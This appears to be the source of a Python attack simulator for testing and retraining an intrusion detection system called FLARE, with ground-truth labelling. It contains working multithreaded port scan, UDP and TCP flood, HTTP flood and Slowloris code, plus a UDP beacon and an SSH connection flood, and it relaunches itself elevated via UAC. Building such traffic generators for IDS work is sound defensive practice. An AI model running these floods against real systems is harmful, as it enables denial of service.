#!/usr/bin/env python3
"""
FLARE -- Attack Simulator v4
===================================
Comprehensive attack simulation for FLARE IDS end-to-end testing.
Runs all feasible attack types in sequence, auto-detects which services
are listening on the target, and records a ground-truth log for retraining.

Improvements over v3:
  - No blocking input() prompt — starts immediately
  - Auto-detects SSH / HTTP before attempting service-dependent attacks
  - --detect mode: tests detection without retraining (no ground truth needed)
  - --all flag: runs every attack that auto-detection says is feasible
  - ASCII-safe output (no unicode box chars that break on Windows cp1252)
  - Beacon uses UDP by default (no server required)
  - Cleaner per-phase summary table

Attack types:
  portscan   TCP connect scan, ports 1-5000 (no server needed)
  udpflood   UDP flood to random ports   (no server needed)
  tcpflood   TCP SYN/data flood          (no server needed)
  beacon     Botnet C2 beaconing via UDP (no server needed)
  ssh        SSH brute-force (port 22)   (needs SSH server on target)
  webflood   HTTP GET flood (port 80)    (needs HTTP server on target)
  slowloris  Slowloris DoS (port 80)    (needs HTTP server on target)

Usage:
  # Interactive mode -- no arguments needed, asks via numbered menu:
  python attack_sim_network.py

  # Detection test (no retraining, no ground-truth log):
  python attack_sim_v4.py --target <TARGET-IP> --detect

  # Run specific attacks only:
  python attack_sim_v4.py --target <TARGET-IP> --attacks portscan udpflood tcpflood

  # Run everything feasible (auto-skips attacks needing closed services):
  python attack_sim_v4.py --target <TARGET-IP> --all

  # Full run with longer phases for retraining data collection:
  python attack_sim_v4.py --target <TARGET-IP> --all --duration 90 --quiet 25

  # Enable HTTP server on target first for webflood/slowloris:
  #  python -m http.server 80 (on the target machine)
  # Enable SSH for ssh attack:
  #  Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd
"""

import argparse
import csv
import ctypes
import os
import queue
import random
import socket
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

# ── Paths ─────────────────────────────────────────────────────────────────────
_HERE = Path(__file__).parent

# ── Ground-truth log ──────────────────────────────────────────────────────────
_GT_LOCK   = threading.Lock()
_GT_FILE   = None
_GT_WRITER = None
_GT_PATH   = None


def _gt_open(path: Path):
    global _GT_FILE, _GT_WRITER, _GT_PATH
    _GT_PATH = path.resolve()
    _GT_FILE = open(_GT_PATH, "w", newline="", encoding="utf-8")
    _GT_WRITER = csv.writer(_GT_FILE)
    _GT_WRITER.writerow(["unix_us", "event", "attack_type", "detail"])
    _GT_FILE.flush()
    print(f"\n  [GT] Ground truth: {_GT_PATH}")
    print(f"       Copy this to the desktop machine after the run.\n")


def _gt_write(event: str, attack_type: str, detail: str = ""):
    if _GT_WRITER is None:
        return
    now_us = int(time.time() * 1_000_000)
    with _GT_LOCK:
        _GT_WRITER.writerow([now_us, event, attack_type, detail])
        _GT_FILE.flush()
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"  [{ts}] GT  {event:<12} {attack_type}  {detail}")


def _gt_close():
    if _GT_FILE:
        _GT_FILE.close()


# ── Logging ───────────────────────────────────────────────────────────────────
_LOG_LOCK = threading.Lock()


def _log(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    with _LOG_LOCK:
        print(f"  [{ts}] {msg}")


def _header(text: str):
    bar = "=" * 64
    print(f"\n{bar}")
    print(f"  {text}")
    print(bar)


def _subheader(text: str):
    print(f"\n  -- {text} {'─' * max(0, 56 - len(text))}")


def _is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _elevate_if_needed():
    """
    Re-launch this script with administrator rights via a UAC prompt if it is
    not already running elevated. The elevated instance inherits the same
    command-line arguments; this (non-elevated) instance then exits.
    No-op on non-Windows or if already admin.
    """
    if _is_admin():
        return
    try:
        params = " ".join(f'"{a}"' for a in sys.argv[1:])
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            f'"{os.path.abspath(__file__)}" {params}', None, 1,
        )
    except Exception as exc:
        print(f"  [!] Could not request elevation ({exc}). Continuing without admin.")
        return
    if rc <= 32:
        print("  [!] Administrator elevation was declined. Continuing without admin.")
        sys.exit(1)
    # Elevated instance has been launched in a new window — hand off to it.
    sys.exit(0)


# ── Counter ───────────────────────────────────────────────────────────────────
class _Counter:
    def __init__(self):
        self._v    = 0
        self._lock = threading.Lock()

    def inc(self, n: int = 1):
        with self._lock:
            self._v += n

    def get(self) -> int:
        with self._lock:
            return self._v


# ── Service detection ─────────────────────────────────────────────────────────

def _port_open(host: str, port: int, timeout: float = 1.5) -> bool:
    """Return True if a TCP connect to host:port succeeds within timeout."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except OSError:
        return False


def probe_services(target: str) -> dict:
    """
    Check which optional services are listening on the target.
    Returns a dict of {service_name: bool}.
    """
    _subheader("Probing target services")
    _SVC_PORTS = {"ssh": 22, "http": 80, "https": 443}
    services = {svc: _port_open(target, port) for svc, port in _SVC_PORTS.items()}
    for svc, up in services.items():
        port   = _SVC_PORTS[svc]
        status = "OPEN   <-- attack available" if up else "closed (attack will be skipped)"
        print(f"    port {port:>5} ({svc:<5})  {status}")
    return services


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK MODULES (identical logic to v3, kept for consistency)
# ═══════════════════════════════════════════════════════════════════════════════

def attack_portscan(target: str, duration: float, n_threads: int = 200) -> dict:
    """TCP connect scan — continuously cycles through ports 1-5000 for the full duration."""
    ALL_PORTS = list(range(1, 5001))

    open_p   = _Counter()
    closed   = _Counter()
    errors   = _Counter()
    total    = _Counter()
    deadline = time.monotonic() + duration

    def _worker():
        # Cycle through ports repeatedly until deadline so flows are generated
        # continuously across the full duration window (not just the first 7s).
        ports = ALL_PORTS[:]
        random.shuffle(ports)
        idx = 0
        while time.monotonic() < deadline:
            port = ports[idx % len(ports)]
            idx += 1
            if idx % len(ports) == 0:
                random.shuffle(ports)   # reshuffle each full cycle
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                r = s.connect_ex((target, port))
                (open_p if r == 0 else closed).inc()
                s.close()
            except (socket.timeout, OSError):
                errors.inc()
            finally:
                total.inc()

    _log(f"PortScan: {n_threads} threads, ports 1-5000 -> {target}")
    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(n_threads)]
    for t in threads:
        t.start()
    _progress_loop(deadline, lambda: f"PortScan: {total.get():,} probes  open={open_p.get()}  closed={closed.get()}")
    for t in threads:
        t.join(timeout=0.5)

    return {"total": total.get(), "open": open_p.get(), "closed": closed.get(), "errors": errors.get()}


def attack_udpflood(target: str, duration: float,
                    n_ports: int = 500, n_threads: int = 50) -> dict:
    """UDP flood to random destination ports — no server required."""
    dest_ports = [random.randint(1025, 60000) for _ in range(n_ports)]
    sent     = _Counter()
    errors   = _Counter()
    deadline = time.monotonic() + duration

    def _sender():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.monotonic() < deadline:
            port    = random.choice(dest_ports)
            payload = os.urandom(random.randint(64, 1400))
            try:
                sock.sendto(payload, (target, port))
                sent.inc()
            except OSError:
                errors.inc()
        sock.close()

    _log(f"UDPFlood: {n_threads} senders, {n_ports} destination ports -> {target}")
    threads = [threading.Thread(target=_sender, daemon=True) for _ in range(n_threads)]
    for t in threads:
        t.start()
    _progress_loop(deadline, lambda: f"UDPFlood: {sent.get():,} datagrams sent")
    for t in threads:
        t.join(timeout=0.5)

    return {"datagrams_sent": sent.get(), "dest_ports": n_ports, "errors": errors.get()}


def attack_tcpflood(target: str, duration: float,
                    n_threads: int = 100, burst_bytes: int = 256) -> dict:
    """Rapid TCP connects with data burst — no server required (RST on closed ports)."""
    connects = _Counter()
    rejected = _Counter()
    deadline = time.monotonic() + duration
    burst    = os.urandom(burst_bytes)

    def _connector():
        while time.monotonic() < deadline:
            port = random.randint(1024, 60000)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((target, port))
                try:
                    s.send(burst)
                except OSError:
                    pass
                s.close()
                connects.inc()
            except (ConnectionRefusedError, socket.timeout, OSError):
                rejected.inc()
            finally:
                try:
                    s.close()
                except Exception:
                    pass

    _log(f"TCPFlood: {n_threads} threads, {burst_bytes}B payload -> {target}")
    threads = [threading.Thread(target=_connector, daemon=True) for _ in range(n_threads)]
    for t in threads:
        t.start()
    _progress_loop(deadline, lambda: f"TCPFlood: connected={connects.get():,}  rejected={rejected.get():,}")
    for t in threads:
        t.join(timeout=0.5)

    return {"attempted": connects.get() + rejected.get(), "connected": connects.get(), "rejected": rejected.get()}


def attack_beacon(target: str, duration: float,
                  n_flows: int = 40, iat_secs: float = 2.0) -> dict:
    """
    Botnet C2 beaconing via UDP — no server required.
    N concurrent 'flows' each send one small UDP packet every IAT seconds.
    Produces long-lived, low-bandwidth, regular-interval traffic signature.
    Falls back to TCP port 80 if --http flag passed.
    """
    sends    = _Counter()
    errors   = _Counter()
    deadline = time.monotonic() + duration

    # Use UDP beacons (no server required, produces cleaner one-way flow signature)
    beacon_port = random.randint(8000, 9000)
    payload     = b"BEACON:" + os.urandom(32)

    def _beacon_flow():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.monotonic() < deadline:
            try:
                sock.sendto(payload, (target, beacon_port))
                sends.inc()
            except OSError:
                errors.inc()
            time.sleep(iat_secs + random.uniform(-0.1, 0.1))  # slight jitter
        sock.close()

    _log(f"Beacon: {n_flows} flows -> {target}:{beacon_port}  IAT={iat_secs}s")
    threads = [threading.Thread(target=_beacon_flow, daemon=True) for _ in range(n_flows)]
    for t in threads:
        t.start()
    _progress_loop(deadline, lambda: f"Beacon: {sends.get():,} beacons sent  errors={errors.get()}")
    for t in threads:
        t.join(timeout=0.5)

    return {"beacon_flows": n_flows, "beacons_sent": sends.get(), "iat_secs": iat_secs, "errors": errors.get()}


def attack_ssh(target: str, duration: float,
               n_threads: int = 20, port: int = 22) -> dict:
    """SSH brute-force — requires SSH server on target."""
    connects = _Counter()
    failed   = _Counter()
    deadline = time.monotonic() + duration

    def _brute():
        while time.monotonic() < deadline:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((target, port))
                try:
                    s.recv(256)  # read SSH banner
                except OSError:
                    pass
                s.close()
                connects.inc()
            except (ConnectionRefusedError, socket.timeout, OSError):
                failed.inc()
            finally:
                try:
                    s.close()
                except Exception:
                    pass
            time.sleep(random.uniform(0.05, 0.15))

    _log(f"SSHBrute: {n_threads} threads -> {target}:{port}")
    threads = [threading.Thread(target=_brute, daemon=True) for _ in range(n_threads)]
    for t in threads:
        t.start()
    _progress_loop(deadline, lambda: f"SSHBrute: connected={connects.get():,}  failed={failed.get():,}")
    for t in threads:
        t.join(timeout=0.5)

    return {"attempted": connects.get() + failed.get(), "connected": connects.get(), "failed": failed.get()}


def attack_webflood(target: str, duration: float,
                    n_threads: int = 50, port: int = 80) -> dict:
    """HTTP GET flood — requires HTTP server on target (python -m http.server 80)."""
    PATHS  = ["/", "/index.html", "/login", "/api/v1/data", "/admin"]
    sent   = _Counter()
    errors = _Counter()
    deadline = time.monotonic() + duration

    def _requester():
        while time.monotonic() < deadline:
            path    = random.choice(PATHS)
            payload = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Mozilla/5.0 (compatible; FLARE-Test)\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((target, port))
                s.sendall(payload)
                try:
                    s.recv(1024)
                except OSError:
                    pass
                s.close()
                sent.inc()
            except (ConnectionRefusedError, socket.timeout, OSError):
                errors.inc()
            finally:
                try:
                    s.close()
                except Exception:
                    pass

    _log(f"WebFlood: {n_threads} threads -> {target}:{port}")
    threads = [threading.Thread(target=_requester, daemon=True) for _ in range(n_threads)]
    for t in threads:
        t.start()
    _progress_loop(deadline, lambda: f"WebFlood: {sent.get():,} requests  errors={errors.get()}")
    for t in threads:
        t.join(timeout=0.5)

    return {"requests_sent": sent.get(), "errors": errors.get(), "port": port}


def attack_slowloris(target: str, duration: float,
                     n_sockets: int = 150, port: int = 80) -> dict:
    """Slowloris DoS — requires HTTP server on target."""
    sockets   = []
    connected = _Counter()
    deadline  = time.monotonic() + duration

    _log(f"Slowloris: opening {n_sockets} sockets -> {target}:{port}")
    for _ in range(n_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
            sockets.append(s)
            connected.inc()
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass

    _log(f"Slowloris: {connected.get()} connections established")
    alive_count = connected.get()

    while time.monotonic() < deadline:
        dead = []
        alive_count = 0
        for s in sockets:
            try:
                s.send(b"X-a: b\r\n")
                alive_count += 1
            except OSError:
                dead.append(s)
        for s in dead:
            sockets.remove(s)
            try:
                ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ns.settimeout(4.0)
                ns.connect((target, port))
                ns.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
                sockets.append(ns)
                alive_count += 1
            except (ConnectionRefusedError, socket.timeout, OSError):
                pass
        _log(f"Slowloris: {alive_count}/{n_sockets} sockets alive")
        time.sleep(5)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    return {"initial_connections": connected.get(), "port": port}


# ── Progress helper ────────────────────────────────────────────────────────────

def _progress_loop(deadline: float, status_fn, interval: float = 5.0):
    last = time.monotonic()
    while time.monotonic() < deadline:
        now = time.monotonic()
        if now - last >= interval:
            _log(status_fn())
            last = now
        time.sleep(0.5)


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK REGISTRY
# ═══════════════════════════════════════════════════════════════════════════════

ALL_ATTACKS = ["portscan", "udpflood", "tcpflood", "beacon", "ssh", "webflood", "slowloris"]

# Attacks that require a specific TCP port to be open on the target
_REQUIRES_PORT = {
    "ssh"      : 22,
    "webflood" : 80,
    "slowloris": 80,
}

ATTACK_FNS = {
    "portscan" : attack_portscan,
    "udpflood" : attack_udpflood,
    "tcpflood" : attack_tcpflood,
    "beacon"   : attack_beacon,
    "ssh"      : attack_ssh,
    "webflood" : attack_webflood,
    "slowloris": attack_slowloris,
}

# CICIDS2017-style label for ground-truth log (used for retraining)
ATTACK_LABELS = {
    "portscan" : "PortScan",
    "udpflood" : "UDPFlood",
    "tcpflood" : "TCPFlood",
    "beacon"   : "Botnet",
    "ssh"      : "SSHPatator",
    "webflood" : "DoS-WebFlood",
    "slowloris": "DoS-Slowloris",
}


# ═══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

def run(
    target:    str,
    attacks:   list,
    duration:  float,
    quiet:     float,
    gt_output: Path | None,
    detect:    bool,
):
    services = probe_services(target)

    # Filter attacks that need a closed port
    runnable  = []
    skipped   = []
    for atk in attacks:
        required_port = _REQUIRES_PORT.get(atk)
        if required_port is not None and not _port_open(target, required_port):
            skipped.append((atk, f"port {required_port} closed on {target}"))
        else:
            runnable.append(atk)

    if not runnable:
        print("\n  [!] No runnable attacks after service check. Exiting.")
        return

    if gt_output and not detect:
        _gt_open(gt_output)

    total_time = int((duration + quiet) * len(runnable))

    _header(f"FLARE Attack Simulator v4  --  {target}")
    print(f"  Mode       : {'detection test (no ground truth)' if detect else 'full run with ground truth'}")
    print(f"  Attacks    : {', '.join(runnable)}")
    if skipped:
        print(f"  Skipped    : {', '.join(f'{a} ({r})' for a, r in skipped)}")
    print(f"  Duration   : {duration}s per phase  |  Quiet: {quiet}s between phases")
    print(f"  Total time : ~{total_time // 60}m {total_time % 60}s")
    if gt_output and not detect:
        print(f"  Ground log : {_GT_PATH}")
    print()

    summary = []

    for idx, attack_name in enumerate(runnable, 1):
        label = ATTACK_LABELS[attack_name]
        _header(f"PHASE {idx}/{len(runnable)}  {attack_name.upper()}  [{label}]  {duration}s")

        if not detect:
            _gt_write("PHASE_START", label, f"target={target} duration={duration}")

        fn    = ATTACK_FNS[attack_name]
        t0    = time.time()
        stats = fn(target, duration)
        elapsed = time.time() - t0

        if not detect:
            _gt_write("PHASE_END", label, " ".join(f"{k}={v}" for k, v in stats.items()))

        stats["elapsed_s"] = f"{elapsed:.1f}"
        summary.append((attack_name, label, stats))
        print(f"\n  Phase complete: {label}")
        for k, v in stats.items():
            print(f"    {k:<30}: {v}")

        if idx < len(runnable):
            print(f"\n  -- Quiet period ({quiet}s) — CICFlowMeter flushing flows --")
            remaining = int(quiet)
            while remaining > 0:
                step = min(5, remaining)
                time.sleep(step)
                remaining -= step
                if remaining > 0:
                    print(f"     {remaining}s remaining...")

    # ── Final summary ─────────────────────────────────────────────────────────
    _header("SIMULATION COMPLETE")
    print(f"  {'Attack':<12}  {'Label':<18}  Key result")
    print(f"  {'-'*12}  {'-'*18}  {'-'*30}")
    for atk, lbl, st in summary:
        kv = next(iter(st.items()))
        print(f"  {atk:<12}  {lbl:<18}  {kv[0]}={kv[1]}")

    if skipped:
        print(f"\n  Skipped (service not available):")
        for atk, reason in skipped:
            print(f"    {atk:<12}  {reason}")
        print(f"\n  To enable skipped attacks on the target:")
        if any(a == "ssh" for a, _ in skipped):
            print("    SSH:  Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd")
        if any(a in ("webflood", "slowloris") for a, _ in skipped):
            print("    HTTP: python -m http.server 80")

    if gt_output and not detect:
        print(f"\n  Ground truth : {_GT_PATH}")
        print(f"\n  Next steps (retraining):")
        print(f"    1. Ctrl+C capture_labeled_v2.py on the desktop")
        print(f"    2. python label_by_timestamp.py --capture local_v3.csv \\")
        print(f"                                    --ground-truth {_GT_PATH.name} \\")
        print(f"                                    --output local_labeled_v3.csv")
        print(f"    3. python train_v06.py --local local_labeled_v3.csv")
        print(f"    4. Copy models/* to FLARE/client/network/models/")

    _gt_close()


# ═══════════════════════════════════════════════════════════════════════════════
# INTERACTIVE MENU (used when the script is run with no arguments)
# ═══════════════════════════════════════════════════════════════════════════════

# Numbered presets shown to the user. Each maps to a list of attack names
# from ALL_ATTACKS, or the special string "ALL" / "DETECT".
_MENU_PRESETS = {
    "1": ("UDP Flood",                                    ["udpflood"]),
    "2": ("TCP Flood",                                    ["tcpflood"]),
    "3": ("TCP + UDP Flood",                              ["tcpflood", "udpflood"]),
    "4": ("TCP + UDP Flood + Port Scan",                  ["tcpflood", "udpflood", "portscan"]),
    "5": ("Port Scan only",                               ["portscan"]),
    "6": ("Botnet Beacon only",                           ["beacon"]),
    "7": ("SSH Brute-force (needs SSH on target)",        ["ssh"]),
    "8": ("HTTP Flood (needs HTTP server on target)",     ["webflood"]),
    "9": ("Slowloris DoS (needs HTTP server on target)",  ["slowloris"]),
    "10": ("Detection test: PortScan+UDPFlood+TCPFlood+Beacon (no ground truth)",
           ["portscan", "udpflood", "tcpflood", "beacon"]),
    "11": ("Run everything (auto-skips attacks needing closed services)", "ALL"),
}


def _ask(prompt: str, default: str | None = None) -> str:
    suffix = f" [{default}]" if default is not None else ""
    while True:
        val = input(f"{prompt}{suffix}: ").strip()
        if val:
            return val
        if default is not None:
            return default
        print("  Please enter a value.")


def _ask_float(prompt: str, default: float) -> float:
    while True:
        val = input(f"{prompt} [{default}]: ").strip()
        if not val:
            return default
        try:
            return float(val)
        except ValueError:
            print("  Please enter a number.")


def _ask_yes_no(prompt: str, default: bool = False) -> bool:
    suffix = "Y/n" if default else "y/N"
    val = input(f"{prompt} ({suffix}): ").strip().lower()
    if not val:
        return default
    return val in ("y", "yes")


def interactive_menu():
    """
    Prompt the user for everything needed to run a simulation, using a
    numbered menu instead of command-line flags. Returns a dict of kwargs
    suitable for run().
    """
    _header("FLARE Network Attack Simulator -- Interactive Mode")

    print("\n  What attack(s) do you want to run?\n")
    for key in sorted(_MENU_PRESETS, key=lambda k: int(k)):
        label, _ = _MENU_PRESETS[key]
        print(f"    {key:>2}) {label}")
    print(f"    {'12':>2}) Custom selection (pick individual attacks)")

    choice = ""
    while choice not in _MENU_PRESETS and choice != "12":
        choice = input(f"\n  Choice [1-12]: ").strip()

    if choice == "12":
        print("\n  Available attacks:")
        for i, atk in enumerate(ALL_ATTACKS, 1):
            print(f"    {i}) {atk} ({ATTACK_LABELS[atk]})")
        raw = _ask("\n  Enter numbers separated by spaces or commas")
        idxs = [s for s in raw.replace(",", " ").split() if s]
        attacks = []
        for s in idxs:
            try:
                n = int(s)
                if 1 <= n <= len(ALL_ATTACKS):
                    attacks.append(ALL_ATTACKS[n - 1])
            except ValueError:
                pass
        if not attacks:
            print("  No valid attacks selected -- defaulting to udpflood + tcpflood.")
            attacks = ["udpflood", "tcpflood"]
    else:
        _, attacks = _MENU_PRESETS[choice]
        if attacks == "ALL":
            attacks = ALL_ATTACKS

    detect = (choice == "10")

    print()
    target = _ask("  What is your target IP")

    duration = _ask_float("  Duration per attack phase in seconds", 60.0)
    quiet    = _ask_float("  Quiet gap between phases in seconds", 20.0)

    if not detect:
        detect = _ask_yes_no("  Detection-test mode (skip ground-truth log)", default=False)

    gt_path = None
    if not detect:
        gt_default = str(_HERE / "attack_ground_truth.csv")
        gt_path = Path(_ask("  Ground-truth CSV output path", gt_default))

    return {
        "target":    target,
        "attacks":   attacks,
        "duration":  duration,
        "quiet":     quiet,
        "gt_output": gt_path,
        "detect":    detect,
    }


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    # Run with administrator privileges — relaunch elevated via UAC if needed.
    _elevate_if_needed()

    # ── No arguments at all -> interactive numbered-menu mode ────────────────
    if len(sys.argv) == 1:
        kwargs = interactive_menu()
        run(**kwargs)
        return

    parser = argparse.ArgumentParser(
        description="FLARE Attack Simulator v4 — all attacks, auto-service-detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Quick detection test (all feasible attacks, no ground truth):
  python attack_sim_v4.py --target <TARGET-IP> --detect

  # Specific attacks only:
  python attack_sim_v4.py --target <TARGET-IP> --attacks portscan udpflood tcpflood beacon

  # All attacks (auto-skips attacks needing closed services):
  python attack_sim_v4.py --target <TARGET-IP> --all

  # Full run for retraining (ground truth logged to current dir):
  python attack_sim_v4.py --target <TARGET-IP> --all --duration 90 --quiet 25 --gt-output gt.csv
        """
    )
    parser.add_argument("--target",     required=True,
                        help="Target IP address")
    parser.add_argument("--attacks",    nargs="+", default=[],
                        choices=ALL_ATTACKS,
                        metavar="ATTACK",
                        help=f"Attacks to run: {' '.join(ALL_ATTACKS)}")
    parser.add_argument("--all",        action="store_true",
                        help="Run all attacks (auto-skips those needing closed services)")
    parser.add_argument("--detect",     action="store_true",
                        help="Detection test mode — no ground-truth log written")
    parser.add_argument("--duration",   type=float, default=60.0,
                        help="Seconds per attack phase (default: 60)")
    parser.add_argument("--quiet",      type=float, default=20.0,
                        help="Quiet gap between phases in seconds (default: 20)")
    parser.add_argument("--gt-output",  default=None, metavar="PATH",
                        help="Ground-truth CSV output path (default: ./attack_ground_truth.csv)")
    args = parser.parse_args()

    if args.all:
        attacks = ALL_ATTACKS
    elif args.attacks:
        attacks = args.attacks
    else:
        # Default for detection test: the three attacks that work without services
        attacks = ["portscan", "udpflood", "tcpflood", "beacon"]
        print(f"  No --attacks specified. Defaulting to: {', '.join(attacks)}")
        print(f"  Use --all to run all attacks, or --attacks to pick specific ones.\n")

    if args.detect:
        gt_path = None
    elif args.gt_output:
        gt_path = Path(args.gt_output)
    else:
        gt_path = _HERE / "attack_ground_truth.csv"

    run(
        target    = args.target,
        attacks   = attacks,
        duration  = args.duration,
        quiet     = args.quiet,
        gt_output = gt_path,
        detect    = args.detect,
    )


if __name__ == "__main__":
    main()
